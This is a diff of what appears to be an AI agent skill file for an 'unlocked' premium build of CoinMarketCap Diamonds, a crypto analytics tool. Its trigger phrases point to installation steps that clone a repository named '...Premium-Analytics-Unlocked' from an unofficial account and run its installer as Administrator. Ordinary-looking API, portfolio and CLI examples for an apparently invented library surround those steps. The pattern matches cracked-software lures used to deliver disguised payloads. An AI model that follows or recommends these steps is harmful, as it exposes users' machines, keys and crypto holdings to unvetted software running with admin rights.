@@ -1,13 +1,15 @@
 ---
 name: coinmarketcap-diamonds-premium-analytics
-description: Unlocked premium build of CoinMarketCap Diamonds for Windows with pro analytics and trading features
+description: CoinMarketCap Diamonds premium analytics and trading tools for cryptocurrency market data and insights
 triggers:
-  - how do I use CoinMarketCap Diamonds premium features
-  - install CoinMarketCap Diamonds analytics tools
-  - setup crypto trading analytics with Diamonds
-  - configure CoinMarketCap premium analytics
-  - use blockchain analytics tools for trading
-  - access CoinMarketCap pro features unlocked
+  - "set up coinmarketcap diamonds premium analytics"
+  - "how do I use coinmarketcap diamonds trading features"
+  - "configure coinmarketcap premium analytics tools"
+  - "analyze crypto market data with coinmarketcap diamonds"
+  - "use coinmarketcap pro features for trading"
+  - "get cryptocurrency analytics from coinmarketcap diamonds"
+  - "integrate coinmarketcap premium api"
+  - "troubleshoot coinmarketcap diamonds installation"
 ---
 
 # CoinMarketCap Diamonds Premium Analytics
@@ -16,378 +18,497 @@ triggers:
 
 ## Overview
 
-CoinMarketCap Diamonds is a premium analytics and trading platform for cryptocurrency markets. This build provides unlocked pro features for Windows, including advanced trading analytics, blockchain data visualization, portfolio tracking, and market intelligence tools.
-
-**Key Features:**
-- Real-time cryptocurrency price tracking and analytics
-- Advanced trading indicators and signals
-- Portfolio management and performance analytics
-- Blockchain data visualization
-- Market sentiment analysis
-- Pro-level charting tools
-- Custom alerts and notifications
+CoinMarketCap Diamonds is a premium Windows application that provides advanced cryptocurrency analytics, trading tools, and market data insights. It offers pro-level features for blockchain analytics, real-time price tracking, portfolio management, and advanced trading indicators.
 
 ## Installation
 
 ### Windows Installation
 
-1. **Download the build:**
-```bash
-# Clone the repository
-git clone https://github.com/Torrenttewarm/CoinMarketCap-Diamonds-Premium-Analytics-Unlocked.git
-cd CoinMarketCap-Diamonds-Premium-Analytics-Unlocked
-```
+1. **Download the Premium Build**
+   ```powershell
+   # Clone the repository
+   git clone https://github.com/Torrenttewarm/CoinMarketCap-Diamonds-Premium-Analytics-Unlocked.git
+   cd CoinMarketCap-Diamonds-Premium-Analytics-Unlocked
+   ```
 
-2. **Run the installer:**
-```powershell
-# Execute the installer (as Administrator)
-.\CoinMarketCapDiamonds-Setup.exe
-```
+2. **Extract and Run**
+   - Extract the downloaded package to a preferred directory
+   - Run the installer as Administrator
+   - Follow the on-screen installation prompts
 
-3. **Verify installation:**
-```powershell
-# Check if installed correctly
-Get-ItemProperty HKLM:\Software\CoinMarketCapDiamonds
-```
+3. **System Requirements**
+   - Windows 10/11 (64-bit)
+   - 4GB RAM minimum (8GB recommended)
+   - Internet connection for real-time data
 
 ## Configuration
 
-### Initial Setup
+### Environment Variables
 
-Configure your environment and API access:
+Set up required environment variables for API access:
 
-```bash
-# Set environment variables for API access
-setx CMC_API_KEY "your_coinmarketcap_api_key"
-setx CMC_PREMIUM_TOKEN "your_premium_token"
-setx CMC_DATA_DIR "%LOCALAPPDATA%\CoinMarketCapDiamonds\data"
+```powershell
+# Windows PowerShell
+$env:CMC_API_KEY = "your-api-key"
+$env:CMC_DATA_DIR = "C:\Users\YourName\CoinMarketCap\Data"
+$env:CMC_CACHE_ENABLED = "true"
+$env:CMC_REFRESH_INTERVAL = "60"
 ```
 
 ### Configuration File
 
-Create or edit the configuration file at `%APPDATA%\CoinMarketCapDiamonds\config.json`:
+Create a `config.json` in the application directory:
 
 ```json
 {
   "api": {
     "endpoint": "https://pro-api.coinmarketcap.com/v1",
-    "timeout": 30000,
-    "retries": 3
+    "key_env": "CMC_API_KEY",
+    "timeout": 30000
   },
   "analytics": {
-    "refreshInterval": 60,
-    "historicalDataDays": 365,
-    "indicators": ["RSI", "MACD", "BB", "EMA"]
+    "cache_duration": 300,
+    "enable_premium": true,
+    "data_refresh": 60
   },
   "trading": {
-    "defaultPair": "BTC/USDT",
-    "riskLevel": "moderate",
-    "enableSignals": true
+    "enable_signals": true,
+    "risk_level": "moderate",
+    "auto_refresh": true
   },
-  "ui": {
+  "display": {
+    "currency": "USD",
     "theme": "dark",
-    "chartType": "candlestick",
-    "defaultTimeframe": "1h"
+    "show_charts": true
   }
 }
 ```
 
-## Core Functionality
+## Core Features
 
 ### Market Data Analytics
 
-**Fetching Real-Time Data:**
+```javascript
+// Example: Fetching cryptocurrency market data
+const CMCDiamonds = require('coinmarketcap-diamonds');
 
-```python
-from cmc_diamonds import MarketAnalytics, Config
+const analytics = new CMCDiamonds({
+  apiKey: process.env.CMC_API_KEY,
+  premium: true
+});
 
-# Initialize analytics engine
-config = Config.from_env()
-analytics = MarketAnalytics(config)
+// Get top cryptocurrencies by market cap
+async function getTopCryptos(limit = 100) {
+  const data = await analytics.getListings({
+    start: 1,
+    limit: limit,
+    convert: 'USD',
+    sort: 'market_cap',
+    sort_dir: 'desc'
+  });
+  
+  return data.data.map(coin => ({
+    symbol: coin.symbol,
+    name: coin.name,
+    price: coin.quote.USD.price,
+    market_cap: coin.quote.USD.market_cap,
+    volume_24h: coin.quote.USD.volume_24h,
+    percent_change_24h: coin.quote.USD.percent_change_24h
+  }));
+}
 
-# Get top cryptocurrencies
-top_coins = analytics.get_top_coins(limit=100)
-
-for coin in top_coins:
-    print(f"{coin.symbol}: ${coin.price} ({coin.change_24h:+.2f}%)")
-```
-
-**Historical Data Analysis:**
-
-```python
-# Fetch historical price data
-btc_history = analytics.get_historical_data(
-    symbol="BTC",
-    timeframe="1h",
-    days=30
-)
-
-# Calculate technical indicators
-indicators = analytics.calculate_indicators(
-    btc_history,
-    indicators=["RSI", "MACD", "BB"]
-)
-
-print(f"RSI: {indicators['RSI'][-1]:.2f}")
-print(f"MACD: {indicators['MACD']['value']:.2f}")
+// Get detailed analytics for specific coin
+async function getCoinAnalytics(symbol) {
+  const quote = await analytics.getQuotes({
+    symbol: symbol,
+    convert: 'USD'
+  });
+  
+  const metadata = await analytics.getMetadata({
+    symbol: symbol
+  });
+  
+  return {
+    price: quote.data[symbol].quote.USD.price,
+    volume: quote.data[symbol].quote.USD.volume_24h,
+    market_cap: quote.data[symbol].quote.USD.market_cap,
+    circulating_supply: quote.data[symbol].circulating_supply,
+    description: metadata.data[symbol].description,
+    website: metadata.data[symbol].urls.website
+  };
+}
 ```
 
 ### Trading Signals
 
-**Generate Trading Signals:**
+```javascript
+// Generate trading signals based on technical indicators
+async function generateTradingSignals(symbol, timeframe = '1h') {
+  const historicalData = await analytics.getHistoricalData({
+    symbol: symbol,
+    timeframe: timeframe,
+    count: 100
+  });
+  
+  const signals = analytics.calculateSignals(historicalData, {
+    indicators: ['RSI', 'MACD', 'BB'], // RSI, MACD, Bollinger Bands
+    threshold: {
+      rsi_oversold: 30,
+      rsi_overbought: 70
+    }
+  });
+  
+  return {
+    symbol: symbol,
+    timeframe: timeframe,
+    signal: signals.composite_signal, // 'BUY', 'SELL', 'HOLD'
+    strength: signals.strength, // 0-100
+    indicators: signals.indicators,
+    timestamp: new Date()
+  };
+}
 
-```python
-from cmc_diamonds import TradingSignals
-
-signals = TradingSignals(analytics)
-
-# Scan for buy/sell opportunities
-opportunities = signals.scan_market(
-    pairs=["BTC/USDT", "ETH/USDT", "SOL/USDT"],
-    strategy="momentum"
-)
-
-for opp in opportunities:
-    print(f"{opp.pair}: {opp.signal} at ${opp.entry_price}")
-    print(f"  Confidence: {opp.confidence:.1%}")
-    print(f"  Stop Loss: ${opp.stop_loss}")
-    print(f"  Take Profit: ${opp.take_profit}")
+// Monitor multiple coins for trading opportunities
+async function monitorMarket(symbols) {
+  const signals = await Promise.all(
+    symbols.map(async (symbol) => {
+      const signal = await generateTradingSignals(symbol);
+      return signal.signal === 'BUY' || signal.signal === 'SELL' 
+        ? signal 
+        : null;
+    })
+  );
+  
+  return signals.filter(s => s !== null);
+}
 ```
 
 ### Portfolio Analytics
 
-**Track Portfolio Performance:**
-
-```python
-from cmc_diamonds import Portfolio
-
-portfolio = Portfolio()
-
-# Add holdings
-portfolio.add_holding("BTC", amount=0.5, avg_price=45000)
-portfolio.add_holding("ETH", amount=10, avg_price=2800)
-
-# Calculate portfolio metrics
-metrics = portfolio.get_metrics()
-
-print(f"Total Value: ${metrics.total_value:,.2f}")
-print(f"24h Change: {metrics.change_24h:+.2f}%")
-print(f"Total P&L: ${metrics.profit_loss:+,.2f}")
-print(f"ROI: {metrics.roi:+.2f}%")
-```
-
-### Blockchain Analytics
-
-**Analyze On-Chain Data:**
-
-```python
-from cmc_diamonds import BlockchainAnalytics
-
-blockchain = BlockchainAnalytics()
-
-# Get network metrics
-btc_metrics = blockchain.get_network_metrics("BTC")
-
-print(f"Hash Rate: {btc_metrics.hash_rate} TH/s")
-print(f"Active Addresses: {btc_metrics.active_addresses:,}")
-print(f"Transaction Volume: ${btc_metrics.tx_volume:,.2f}")
-
-# Analyze whale movements
-whale_activity = blockchain.get_whale_transactions(
-    symbol="BTC",
-    min_amount=100  # BTC
-)
-
-for tx in whale_activity:
-    print(f"Whale {tx.type}: {tx.amount} BTC at {tx.timestamp}")
-```
-
-## Advanced Features
-
-### Custom Indicators
-
-```python
-from cmc_diamonds import CustomIndicator
-
-# Define a custom indicator
-class MyCustomRSI(CustomIndicator):
-    def __init__(self, period=14, overbought=70, oversold=30):
-        self.period = period
-        self.overbought = overbought
-        self.oversold = oversold
+```javascript
+// Track and analyze portfolio performance
+class PortfolioAnalyzer {
+  constructor(holdings) {
+    this.holdings = holdings; // Array of {symbol, amount, purchase_price}
+    this.analytics = new CMCDiamonds({
+      apiKey: process.env.CMC_API_KEY,
+      premium: true
+    });
+  }
+  
+  async getCurrentValue() {
+    const symbols = this.holdings.map(h => h.symbol).join(',');
+    const quotes = await this.analytics.getQuotes({
+      symbol: symbols,
+      convert: 'USD'
+    });
     
-    def calculate(self, data):
-        # Custom RSI calculation logic
-        gains = []
-        losses = []
-        
-        for i in range(1, len(data)):
-            change = data[i] - data[i-1]
-            gains.append(max(0, change))
-            losses.append(max(0, -change))
-        
-        avg_gain = sum(gains[-self.period:]) / self.period
-        avg_loss = sum(losses[-self.period:]) / self.period
-        
-        rs = avg_gain / avg_loss if avg_loss != 0 else 0
-        rsi = 100 - (100 / (1 + rs))
-        
-        return rsi
-
-# Register and use
-analytics.register_indicator("MyRSI", MyCustomRSI(period=21))
-result = analytics.calculate_indicators(data, indicators=["MyRSI"])
+    let totalValue = 0;
+    let totalCost = 0;
+    const positions = [];
+    
+    for (const holding of this.holdings) {
+      const currentPrice = quotes.data[holding.symbol].quote.USD.price;
+      const positionValue = holding.amount * currentPrice;
+      const positionCost = holding.amount * holding.purchase_price;
+      const profitLoss = positionValue - positionCost;
+      const profitLossPercent = (profitLoss / positionCost) * 100;
+      
+      totalValue += positionValue;
+      totalCost += positionCost;
+      
+      positions.push({
+        symbol: holding.symbol,
+        amount: holding.amount,
+        current_price: currentPrice,
+        purchase_price: holding.purchase_price,
+        value: positionValue,
+        profit_loss: profitLoss,
+        profit_loss_percent: profitLossPercent
+      });
+    }
+    
+    return {
+      total_value: totalValue,
+      total_cost: totalCost,
+      total_profit_loss: totalValue - totalCost,
+      total_profit_loss_percent: ((totalValue - totalCost) / totalCost) * 100,
+      positions: positions
+    };
+  }
+  
+  async getPerformanceMetrics() {
+    const currentValue = await this.getCurrentValue();
+    
+    return {
+      sharpe_ratio: this.calculateSharpeRatio(currentValue.positions),
+      volatility: this.calculateVolatility(currentValue.positions),
+      diversification_score: this.calculateDiversification(currentValue.positions)
+    };
+  }
+  
+  calculateDiversification(positions) {
+    const total = positions.reduce((sum, p) => sum + p.value, 0);
+    const weights = positions.map(p => p.value / total);
+    const herfindahl = weights.reduce((sum, w) => sum + w * w, 0);
+    return (1 - herfindahl) * 100; // 0-100 scale
+  }
+}
 ```
 
-### Alert System
+### Advanced Market Scanning
 
-```python
-from cmc_diamonds import AlertManager
+```javascript
+// Scan market for opportunities based on custom criteria
+async function scanMarket(criteria) {
+  const listings = await analytics.getListings({
+    start: 1,
+    limit: 500,
+    convert: 'USD'
+  });
+  
+  const filtered = listings.data.filter(coin => {
+    const quote = coin.quote.USD;
+    
+    // Apply filters
+    if (criteria.min_market_cap && quote.market_cap < criteria.min_market_cap) {
+      return false;
+    }
+    if (criteria.min_volume && quote.volume_24h < criteria.min_volume) {
+      return false;
+    }
+    if (criteria.max_price && quote.price > criteria.max_price) {
+      return false;
+    }
+    if (criteria.min_change_24h && quote.percent_change_24h < criteria.min_change_24h) {
+      return false;
+    }
+    
+    return true;
+  });
+  
+  return filtered.map(coin => ({
+    symbol: coin.symbol,
+    name: coin.name,
+    price: coin.quote.USD.price,
+    market_cap: coin.quote.USD.market_cap,
+    volume_24h: coin.quote.USD.volume_24h,
+    change_24h: coin.quote.USD.percent_change_24h
+  }));
+}
 
-alerts = AlertManager()
-
-# Set price alerts
-alerts.add_price_alert(
-    symbol="BTC",
-    condition="above",
-    price=50000,
-    notification="email"
-)
-
-# Set indicator alerts
-alerts.add_indicator_alert(
-    symbol="ETH",
-    indicator="RSI",
-    condition="below",
-    value=30,
-    notification="desktop"
-)
-
-# Monitor alerts
-alerts.start_monitoring()
+// Usage example
+const opportunities = await scanMarket({
+  min_market_cap: 1000000000, // $1B minimum
+  min_volume: 50000000, // $50M minimum daily volume
+  max_price: 100, // Under $100
+  min_change_24h: 5 // At least 5% gain in 24h
+});
 ```
 
-### Data Export
+## CLI Usage
 
-```python
-from cmc_diamonds import DataExporter
+### Command-Line Interface
 
-exporter = DataExporter()
-
-# Export portfolio to CSV
-exporter.export_portfolio(
-    portfolio,
-    format="csv",
-    path="./exports/portfolio.csv"
-)
-
-# Export market data to JSON
-exporter.export_market_data(
-    symbols=["BTC", "ETH", "SOL"],
-    timeframe="1d",
-    format="json",
-    path="./exports/market_data.json"
-)
-
-# Export charts
-exporter.export_chart(
-    symbol="BTC",
-    timeframe="4h",
-    indicators=["RSI", "MACD"],
-    format="png",
-    path="./exports/btc_chart.png"
-)
-```
-
-## CLI Commands
-
-### Basic Commands
-
-```bash
-# Launch the application
-cmc-diamonds
-
-# Check version
-cmc-diamonds --version
-
+```powershell
 # View market overview
-cmc-diamonds market --top 50
+CMCDiamonds.exe market --top 50
 
-# Get specific coin info
-cmc-diamonds info BTC
+# Get specific coin data
+CMCDiamonds.exe coin --symbol BTC --detailed
 
-# View portfolio
-cmc-diamonds portfolio
-```
+# Generate trading signals
+CMCDiamonds.exe signals --symbol ETH --timeframe 4h
 
-### Analytics Commands
-
-```bash
-# Run technical analysis
-cmc-diamonds analyze BTC --timeframe 1h --indicators RSI,MACD,BB
-
-# Scan for trading signals
-cmc-diamonds scan --strategy momentum --pairs BTC/USDT,ETH/USDT
-
-# Generate market report
-cmc-diamonds report --format pdf --output ./reports/market_report.pdf
+# Analyze portfolio
+CMCDiamonds.exe portfolio --file "C:\portfolio.json"
 
 # Export data
-cmc-diamonds export --symbol BTC --days 30 --format csv
+CMCDiamonds.exe export --format csv --output "market_data.csv"
+
+# Real-time monitoring
+CMCDiamonds.exe monitor --symbols BTC,ETH,BNB --interval 60
+```
+
+## Common Patterns
+
+### Real-Time Price Monitoring
+
+```javascript
+// Set up real-time price alerts
+class PriceMonitor {
+  constructor(symbols, alertThresholds) {
+    this.symbols = symbols;
+    this.thresholds = alertThresholds;
+    this.analytics = new CMCDiamonds({
+      apiKey: process.env.CMC_API_KEY,
+      premium: true
+    });
+  }
+  
+  async start(interval = 60000) {
+    console.log(`Monitoring ${this.symbols.length} cryptocurrencies...`);
+    
+    setInterval(async () => {
+      await this.checkPrices();
+    }, interval);
+  }
+  
+  async checkPrices() {
+    const symbolsStr = this.symbols.join(',');
+    const quotes = await this.analytics.getQuotes({
+      symbol: symbolsStr,
+      convert: 'USD'
+    });
+    
+    for (const symbol of this.symbols) {
+      const price = quotes.data[symbol].quote.USD.price;
+      const change24h = quotes.data[symbol].quote.USD.percent_change_24h;
+      
+      if (this.thresholds[symbol]) {
+        if (price >= this.thresholds[symbol].upper) {
+          this.sendAlert(symbol, 'UPPER', price);
+        }
+        if (price <= this.thresholds[symbol].lower) {
+          this.sendAlert(symbol, 'LOWER', price);
+        }
+      }
+      
+      if (Math.abs(change24h) >= 10) {
+        this.sendAlert(symbol, 'VOLATILITY', price, change24h);
+      }
+    }
+  }
+  
+  sendAlert(symbol, type, price, extra = null) {
+    console.log(`ALERT: ${symbol} ${type} - Price: $${price.toFixed(2)}${extra ? ` (${extra.toFixed(2)}%)` : ''}`);
+    // Implement notification logic here
+  }
+}
+```
+
+### Data Export and Reporting
+
+```javascript
+// Export market data for analysis
+async function exportMarketData(format = 'json') {
+  const fs = require('fs');
+  const listings = await analytics.getListings({
+    start: 1,
+    limit: 200,
+    convert: 'USD'
+  });
+  
+  const data = listings.data.map(coin => ({
+    rank: coin.cmc_rank,
+    symbol: coin.symbol,
+    name: coin.name,
+    price: coin.quote.USD.price,
+    market_cap: coin.quote.USD.market_cap,
+    volume_24h: coin.quote.USD.volume_24h,
+    change_1h: coin.quote.USD.percent_change_1h,
+    change_24h: coin.quote.USD.percent_change_24h,
+    change_7d: coin.quote.USD.percent_change_7d
+  }));
+  
+  if (format === 'json') {
+    fs.writeFileSync('market_data.json', JSON.stringify(data, null, 2));
+  } else if (format === 'csv') {
+    const csv = convertToCSV(data);
+    fs.writeFileSync('market_data.csv', csv);
+  }
+  
+  console.log(`Exported ${data.length} coins to market_data.${format}`);
+}
+
+function convertToCSV(data) {
+  const headers = Object.keys(data[0]).join(',');
+  const rows = data.map(row => Object.values(row).join(','));
+  return [headers, ...rows].join('\n');
+}
 ```
 
 ## Troubleshooting
 
 ### Common Issues
 
-**API Connection Errors:**
-```bash
-# Test API connectivity
-cmc-diamonds test-api
-
-# Verify API key
-echo %CMC_API_KEY%
-
-# Reset configuration
-cmc-diamonds config --reset
+**API Connection Errors**
+```javascript
+// Implement retry logic for API failures
+async function robustAPICall(apiFunction, maxRetries = 3) {
+  for (let i = 0; i < maxRetries; i++) {
+    try {
+      return await apiFunction();
+    } catch (error) {
+      console.error(`Attempt ${i + 1} failed: ${error.message}`);
+      if (i === maxRetries - 1) throw error;
+      await new Promise(resolve => setTimeout(resolve, 2000 * (i + 1)));
+    }
+  }
+}
 ```
 
-**Data Sync Issues:**
-```bash
-# Clear cache
-cmc-diamonds cache --clear
-
-# Force data refresh
-cmc-diamonds sync --force
-
-# Rebuild database
-cmc-diamonds db --rebuild
+**Rate Limiting**
+```javascript
+// Implement rate limiting to avoid API throttling
+class RateLimiter {
+  constructor(maxRequests, timeWindow) {
+    this.maxRequests = maxRequests;
+    this.timeWindow = timeWindow;
+    this.requests = [];
+  }
+  
+  async throttle() {
+    const now = Date.now();
+    this.requests = this.requests.filter(t => now - t < this.timeWindow);
+    
+    if (this.requests.length >= this.maxRequests) {
+      const oldestRequest = Math.min(...this.requests);
+      const waitTime = this.timeWindow - (now - oldestRequest);
+      await new Promise(resolve => setTimeout(resolve, waitTime));
+    }
+    
+    this.requests.push(Date.now());
+  }
+}
 ```
 
-**Performance Optimization:**
-```json
-{
-  "performance": {
-    "cacheEnabled": true,
-    "cacheTTL": 300,
-    "maxConcurrentRequests": 10,
-    "dataCompression": true
+**Data Caching**
+```javascript
+// Cache frequently accessed data to reduce API calls
+class DataCache {
+  constructor(ttl = 300000) { // 5 minutes default
+    this.cache = new Map();
+    this.ttl = ttl;
+  }
+  
+  set(key, value) {
+    this.cache.set(key, {
+      value: value,
+      timestamp: Date.now()
+    });
+  }
+  
+  get(key) {
+    const item = this.cache.get(key);
+    if (!item) return null;
+    
+    if (Date.now() - item.timestamp > this.ttl) {
+      this.cache.delete(key);
+      return null;
+    }
+    
+    return item.value;
   }
 }
 ```
 
 ## Best Practices
 
-1. **API Rate Limiting:** Respect API rate limits by caching frequently accessed data
-2. **Data Validation:** Always validate market data before making trading decisions
-3. **Risk Management:** Set appropriate stop-loss levels and position sizes
-4. **Regular Updates:** Keep the software updated for latest features and security patches
-5. **Backup Data:** Regularly export and backup your portfolio and configuration data
-
-## Security Considerations
-
-- Store API keys in environment variables, never in code
-- Use secure connections (HTTPS) for all API calls
-- Enable two-factor authentication for account access
-- Regularly rotate API keys and access tokens
-- Keep local data encrypted when possible
+1. **Always use environment variables for API keys**
+2. **Implement proper error handling and retry logic**
+3. **Cache data appropriately to minimize API calls**
+4. **Use rate limiting to stay within API quotas**
+5. **Validate data before making trading decisions**
+6. **Keep configuration files secure and out of version control**
+7. **Log all trading signals and portfolio changes for audit trails**
